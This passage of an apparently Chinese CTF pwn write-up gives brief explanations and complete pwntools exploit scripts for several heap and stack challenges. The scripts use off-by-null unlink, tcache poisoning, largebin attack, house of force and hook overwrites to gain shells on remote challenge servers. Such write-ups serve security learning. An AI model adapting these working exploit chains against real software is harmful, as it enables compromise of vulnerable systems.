    io.send(payload)

    leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;read&amp;quot;]
    print(&amp;quot;leak_addr: &amp;quot; + hex(leak_addr))

    open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
    read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
    write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
    mprotect_a=leak_addr+libc.sym[b&amp;quot;mprotect&amp;quot;]
    pop_rdx=leak_addr+0x1b96
    syscall_ret=leak_addr+0x0b1165
    pop_rax=leak_addr+0x1ced0


    payload=p64(bss_addr)*9+p64(ret)*0xb+p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(bss_addr)*2+p64(read_plt)+p64(0x400720)
    io.send(payload)

    io.send(ggg)

    mpp=p64(pop_rdi)+p64(0x601000)+p64(pop_rsi_r15)+p64(0x1000)+p64(0)+p64(pop_rdx)+p64(7)+p64(mprotect_a)+p64(0x400720)

    payload=p64(bss_addr)*9+mpp
    io.send(payload)

    # gdb.attach(io)
    # pause()

    payload=p64(bss_addr)*10
    io.send(payload)
    
    sleep(0.2)
    t=io.recv()
    print(t)
    

while True:
    try:
        # io=process(&amp;quot;./silent&amp;quot;)
        io=remote(&amp;quot;172.10.0.8&amp;quot;,9999)
        elf=ELF(&amp;quot;./silent&amp;quot;)
        libc=elf.libc
        pwn()
        
    except:
        io.close()
        continue

# Gadgets information
# ============================================================
# 0x0000000000400876 : leave ; ret
# 0x00000000004007e2 : mov byte ptr [rip + 0x20084f], 1 ; pop rbp ; ret
# 0x00000000004008f7 : mov eax, 0 ; leave ; ret
# 0x000000000040095c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040095e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400960 : pop r14 ; pop r15 ; ret
# 0x0000000000400962 : pop r15 ; ret
# 0x000000000040095b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040095f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400788 : pop rbp ; ret
# 0x0000000000400963 : pop rdi ; ret
# 0x0000000000400961 : pop rsi ; pop r15 ; ret
# 0x000000000040095d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400696 : ret

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;dfjk2022_smallcontainer&#34;&gt;dfjk2022_smallcontainer:&lt;/h3&gt;
&lt;p&gt;没有uaf，不过edit的时候有&lt;code&gt;check()&lt;/code&gt;会检查输入是否为&lt;code&gt;\x11&lt;/code&gt;，会将&lt;code&gt;\x11&lt;/code&gt;置0,我们只需要将edit的堆块全部写满&lt;code&gt;\x11&lt;/code&gt;，指针递增到下个堆块的&lt;code&gt;\x11&lt;/code&gt;也会置0,这样我们就有一个off by null了&lt;br&gt;
show无检查可以泄露libc&lt;br&gt;
后面构造unlink即可，注意构造unlink的触发堆块不能在tcache里面&lt;br&gt;
unlink后chunk overlap，最后tcachebin attack劫持&lt;code&gt;__free_hook&lt;/code&gt;为&lt;code&gt;one_gadget&lt;/code&gt;即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./service&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28820)
elf=ELF(&amp;quot;./service&amp;quot;)
libc=elf.libc

def add(s):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;index: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;index: &amp;quot;,str(n))
    io.send(cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;index: &amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

for i in range(8):
    add(0x120)

add(0x130) #8

for i in range(8):
    delete(i)
    
add(0x100) #0
show(0)
leak_addr=int(io.recv(12),16)-0x3ebdc0
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
shell=leak_addr+0x4f302


delete(0)
delete(8)

for i in range(7):
    add(0x1f8)

add(0x1f8) #7
add(0x228) #8
add(0x200) #9
add(0x220) #10
add(0x228) #11


#unlink
for i in range(7):
    delete(i)
    
delete(7)

payload=b&amp;quot;\x11&amp;quot;*0x228
edit(8,payload)

payload=b&amp;quot;\x11&amp;quot;*0x220+p64(0x430)
edit(8,payload)

payload=b&amp;quot;\x11&amp;quot;*0x1f8+p64(0x241)
edit(9,payload)
delete(9)



#overlap
delete(11)
delete(8)

add(0x250) #0
edit(0,b&amp;quot;\x00&amp;quot;*0x1f8+p64(0x230)+p64(free_hook))

add(0x228) #1
add(0x228) #2
edit(2,p64(shell))

delete(2)

io.interactive()

# 0x4f2a5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f302 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;gkctf2020_domo&#34;&gt;gkctf2020_domo:&lt;/h3&gt;
&lt;p&gt;add存在off by null，可以unlink构造chunk overlap&lt;br&gt;
劫持&lt;code&gt;__malloc_hook&lt;/code&gt;为&lt;code&gt;one_gadget&lt;/code&gt;&lt;br&gt;
如果直接add调用&lt;code&gt;__malloc_hook&lt;/code&gt;会有检查&lt;br&gt;
可以利用scanf输入过长数据触发&lt;code&gt;malloc()&lt;/code&gt;拿shell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./domo&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28478)
elf=ELF(&amp;quot;./domo&amp;quot;)
libc=elf.libc

def add(s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;index:\n&amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;index:\n&amp;quot;,str(n))

def edit(n,addr,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;addr:\n&amp;quot;,str(addr))
    io.sendafter(b&amp;quot;num:\n&amp;quot;,cc)
    
# gdb.attach(io)
# pause()

add(0x100,b&amp;quot;nmsl&amp;quot;) #0
add(0x20,b&amp;quot;gap&amp;quot;) #1
delete(0)
add(0x100,b&amp;quot;a&amp;quot;) #0
show(0)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x3c4b61
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
shell=leak_addr+0xf1247

add(0xf0,b&amp;quot;aaa&amp;quot;) #2
add(0x68,b&amp;quot;ddd&amp;quot;) #3
add(0xf0,b&amp;quot;eee&amp;quot;) #4
add(0xf0,b&amp;quot;gap&amp;quot;) #5

delete(2)
delete(3)
add(0x68,b&amp;quot;\x00&amp;quot;*0x60+p64(0x170)) #2
delete(4)

delete(2)

add(0x108,cyclic(0xf8)+p64(0x70)+p64(malloc_hook-0x23))

add(0x60,b&amp;quot;rrr&amp;quot;) #6
add(0x60,cyclic(0x13)+p64(shell)) #7

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;*0x10000)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;xyb2021_passwordbox_freeversion&#34;&gt;xyb2021_PassWordBox_FreeVersion:&lt;/h3&gt;
&lt;p&gt;add和show有异或操作，edit无，由于&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mtext&gt;  &lt;/mtext&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mtext&gt;  &lt;/mtext&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mspace width=&#34;1em&#34;/&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;a \; xor \; 0=a \quad(a&amp;gt;=0)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:1em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;，所以采用&lt;code&gt;\x00&lt;/code&gt;泄露异或的&lt;code&gt;key&lt;/code&gt;&lt;br&gt;
add存在off by null，采用unlink打chunk overlap&lt;br&gt;
然后2.27可以double free，劫持&lt;code&gt;__free_hook&lt;/code&gt;为&lt;code&gt;one_gadget&lt;/code&gt;即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;PassWordBox_FreeVersionfrom pwn import *
context(log_level=&amp;quot;debug&amp;quot;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwdFree&amp;quot;) 
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28820)
elf=ELF(&amp;quot;./pwdFree&amp;quot;)
libc=elf.libc

def add(s,cc):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Save:&amp;quot;,b&amp;quot;aaa&amp;quot;)
    io.sendlineafter(b&amp;quot;Of Your Pwd:&amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;Your Pwd:&amp;quot;,cc)
    
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendline(str(n))
    io.send(cc)
    
    
def show(n):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Check:\n&amp;quot;,str(n))
    
    
def delete(n):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Delete:\n&amp;quot;,str(n))


# gdb.attach(io)
# pause()

add(0xf8,b&amp;quot;\x00&amp;quot;*8)
io.recvuntil(b&amp;quot;ID:&amp;quot;)
key=u64(io.recv(8))
print(&amp;quot;key: &amp;quot;,hex(key))
delete(0)

#unlink
for i in range(8):
    add(0xf8,b&amp;quot;a&amp;quot;)

add(0x68,b&amp;quot;aa&amp;quot;) #8
add(0xf8,b&amp;quot;aa&amp;quot;) #9
add(0x20,b&amp;quot;gap&amp;quot;) #10

for i in range(8):
    delete(i)

delete(8)
payload=p64(0xdeadbeef^key)*0xc+p64(0x170^key)
add(0x68,payload)

delete(9)

delete(8)

# ###
for i in range(7):
    add(0xf8,b&amp;quot;www&amp;quot;)

add(0xf8,b&amp;quot;aaa&amp;quot;) #8
show(0)
io.recvuntil(b&amp;quot;is: &amp;quot;)
leak_addr=u64(io.recv(8))^key
leak_addr-=0x3ebca0
print(&amp;quot;leak_addr: &amp;quot; + hex(leak_addr))

shell=leak_addr+0x4f432
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]

add(0x60,b&amp;quot;asd&amp;quot;) #9
show(9)
delete(0)
edit(9,p64(0)*2)
show(9)
delete(9)

add(0x60,p64(free_hook^key))
add(0x60,b&amp;quot;a&amp;quot;)
add(0x60,p64(shell^key))

delete(8)

io.interactive()                     

# 0x4f3d5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f432 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;xyb2021_passwordbox_proversion&#34;&gt;xyb2021_PassWordBox_ProVersion:&lt;/h3&gt;
&lt;p&gt;只能申请largebin大小范围的堆块，采用largebin attack打mp的方法，然后tcache poisoning带走&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwdPro&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28934)
elf=ELF(&amp;quot;./pwdPro&amp;quot;)
libc=elf.libc

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Add:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;Save:&amp;quot;,b&amp;quot;a&amp;quot;*3)
    io.sendlineafter(b&amp;quot;Pwd:&amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;Pwd:&amp;quot;,cc)

def edit(n,cc):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Edit:\n&amp;quot;,str(n))
    io.send(cc)

def show(n):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Check:\n&amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Delete:\n&amp;quot;,str(n))

def recover(n):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;5&amp;quot;)
    io.sendlineafter(b&amp;quot;Recover:\n&amp;quot;,str(n))

# gdb.attach(io)
# pause()

add(0,0x5a0,b&amp;quot;\x00&amp;quot;)
io.recvuntil(b&amp;quot;ID:&amp;quot;)
key=u64(io.recv(8))
print(&amp;quot;key: &amp;quot;,hex(key))

add(1,0x590,b&amp;quot;a&amp;quot;*8)
add(2,0x590,b&amp;quot;a&amp;quot;*8)

delete(0)
recover(0)
show(0)

io.recvuntil(b&amp;quot;is: &amp;quot;)

leak_addr=(u64(io.recv(8))^key)-0x1eb1e0
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
mp_addr=leak_addr+0x1eb2d0


### largebin_attack
add(15,0x800,b&amp;quot;a&amp;quot;*8)
payload=p64(leak_addr+0x1ec010)*2+p64(mp_addr-0x20)*2
edit(0,payload)

delete(2)

add(16,0x800,b&amp;quot;a&amp;quot;)
###

add(6,0x600,b&amp;quot;a&amp;quot;)
add(7,0x600,b&amp;quot;a&amp;quot;)
add(8,0x600,b&amp;quot;a&amp;quot;)

delete(6)
recover(6)
delete(7)
recover(7)

edit(7,p64(free_hook))
add(6,0x600,b&amp;quot;a&amp;quot;)
add(7,0x600,b&amp;quot;a&amp;quot;)
edit(7,p64(sys_addr))

edit(16,b&amp;quot;/bin/sh\x00&amp;quot;)
delete(16)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ycb2023_arrary_index_bank&#34;&gt;ycb2023_arrary_index_bank:&lt;/h3&gt;
&lt;p&gt;OOB read &amp;amp; write&lt;br&gt;
int overflow bypass the check&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28794)
elf=ELF(&amp;quot;./pwn&amp;quot;)

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;account?\n&amp;quot;,b&amp;quot;-2&amp;quot;)
io.recvuntil(b&amp;quot;] = &amp;quot;)
stack_addr=int(io.recvuntil(b&amp;quot;\n&amp;quot;,drop=True),10)
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))


io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;account?\n&amp;quot;,b&amp;quot;-1&amp;quot;)
io.recvuntil(b&amp;quot;] = &amp;quot;)
base_addr=int(io.recvuntil(b&amp;quot;\n&amp;quot;,drop=True),10)-0x1426
print(&amp;quot;base_addr: &amp;quot;,hex(base_addr))

win_addr=base_addr+0x1318
idx=((1&amp;lt;&amp;lt;63)+7)-(1&amp;lt;&amp;lt;64)

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;account?\n&amp;quot;,str(idx))
io.sendlineafter(b&amp;quot;much?\n&amp;quot;,str(win_addr))

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ycb2023_eazy_force&#34;&gt;ycb2023_eazy_force:&lt;/h3&gt;
&lt;p&gt;堆溢出写，任意大小分配可泄露libc，无pie，house of force模板题&lt;br&gt;
劫持scanf_got为&lt;code&gt;one_gadget&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28807)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=elf.libc

scanf_got=0x602050
malloc_got=0x602040

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;away\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;index?\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;want?\n&amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;write?\n&amp;quot;,cc)

# gdb.attach(io)
# pause()

add(0,0x30000,b&amp;quot;nmsl&amp;quot;)
# 0x5bb010
io.recvuntil(b&amp;quot;on &amp;quot;)
leak_addr=int(io.recv(14),16)-0x5bb010
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

shell=leak_addr+0x45226

payload=cyclic(0x28)+p64(0xFFFFFFFFFFFFFFFF)
add(1,0x20,payload)

io.recvuntil(b&amp;quot;on &amp;quot;)
top_chunk=int(io.recvuntil(b&amp;quot; is&amp;quot;,drop=True),16)+0x20
print(&amp;quot;top_chunk: &amp;quot;,hex(top_chunk))


add(2,scanf_got-top_chunk-0x20,b&amp;quot;&amp;quot;)

# gdb.attach(io)
# pause()

add(3,0x10,p64(shell)*2)


io.interactive()

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ycb2023_printf_but_not_fmtstr&#34;&gt;ycb2023_Printf_but_not_fmtstr:&lt;/h3&gt;
&lt;p&gt;2.36 uaf 创建堆块&lt;code&gt;0x500-0x900&lt;/code&gt;&lt;br&gt;
partial relro , pie disable , 给后门函数&lt;br&gt;
打unsafe unlink&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28400)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=elf.libc

win_addr=0x4011d6
chunk_list=0x4040e0

def add(n,s):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)    
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

# gdb.attach(io)
# pause()

fd=chunk_list-0x18
bk=chunk_list-0x10

add(0,0x508) #0
add(1,0x508) #1

delete(0)

payload=p64(0)+p64(0x501)
payload+=p64(fd)+p64(bk)
payload=payload.ljust(0x500,b&amp;quot;\x00&amp;quot;)
payload+=p64(0x500)

edit(0,payload)

delete(1)

payload=p64(0)*3+p64(elf.got[b&amp;quot;puts&amp;quot;])
edit(0,payload)

edit(0,p64(win_addr))

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;cakectf2023_vtable4b&#34;&gt;cakectf2023_vtable4b:&lt;/h3&gt;
&lt;p&gt;泄露地址，观察指针就行了：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;)

io=remote(&amp;quot;vtable4b.2023.cakectf.com&amp;quot;,9000)

io.recvuntil(b&amp;quot;win&amp;gt; = &amp;quot;)
win_addr=int(io.recv(14),16)
print(&amp;quot;win_addr = &amp;quot; + hex(win_addr))



io.recvuntil(b&amp;quot;&amp;gt; &amp;quot;)
io.sendline(b&amp;quot;3&amp;quot;)
pd_addr=int(io.recvuntil(b&amp;quot;&amp;lt;-- message&amp;quot;,drop=True)[-36:-22],16)
print(&amp;quot;pd_addr = &amp;quot; + hex(pd_addr))
io.recvuntil(b&amp;quot;ed0 | &amp;quot;)
tp_addr=int(io.recv(16),16)
print(&amp;quot;tp_addr = &amp;quot; + hex(tp_addr))



io.recvuntil(b&amp;quot;&amp;gt; &amp;quot;)
io.sendline(b&amp;quot;2&amp;quot;)
io.sendlineafter(b&amp;quot;Message: &amp;quot;,p64(win_addr)+b&amp;quot;\x00&amp;quot;*0x10+p64(0x21)+p64(pd_addr)+p64(pd_addr)[:-1])

io.recvuntil(b&amp;quot;&amp;gt; &amp;quot;)
io.sendline(b&amp;quot;1&amp;quot;)

io.interactive()

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;cakectf2023_bofww&#34;&gt;cakectf2023_bofww:&lt;/h3&gt;
&lt;p&gt;cpp pwn，给了后门，partial relro，很明显只能aaw改&lt;code&gt;__stack_chk_fail@GLIBC_2.4&lt;/code&gt;为后门函数&lt;br&gt;
程序最后会调用析构函数，一开始想过劫持&lt;code&gt;_free_hook&lt;/code&gt;，22.04打消这个念头&lt;br&gt;
后面发现如果能控制&lt;code&gt;rbp-0x128&lt;/code&gt;的值就能实现任意地址写，然后一直找不到如何控制，卡老半天&lt;br&gt;
结果发现前面程序流有&lt;code&gt;memcpy&lt;/code&gt;可以直接实现aaw，hh&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;► 0x7f6965f4d170 &amp;lt;std::__cxx11::basic_string&amp;lt;char, std::char_traits&amp;lt;char&amp;gt;, std::allocator&amp;lt;char&amp;gt; &amp;gt;::_M_replace(unsigned long,
unsigned long, char const*, unsigned long)+192&amp;gt;    call   memcpy@plt                &amp;lt;memcpy@plt&amp;gt;
       dest: 0x404050 (__stack_chk_fail@got.plt) —▸ 0x4010a0 ◂— endbr64 
       src: 0x7ffc682d34f0 —▸ 0x4012f6 (win()) ◂— endbr64 
       n: 0x3
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./bofww&amp;quot;)
io=remote(&amp;quot;bofww.2023.cakectf.com&amp;quot;,9002)
elf=ELF(&amp;quot;./bofww&amp;quot;)

win_addr=0x4012f6
chk_fail=0x404050

# gdb.attach(io)
# pause()

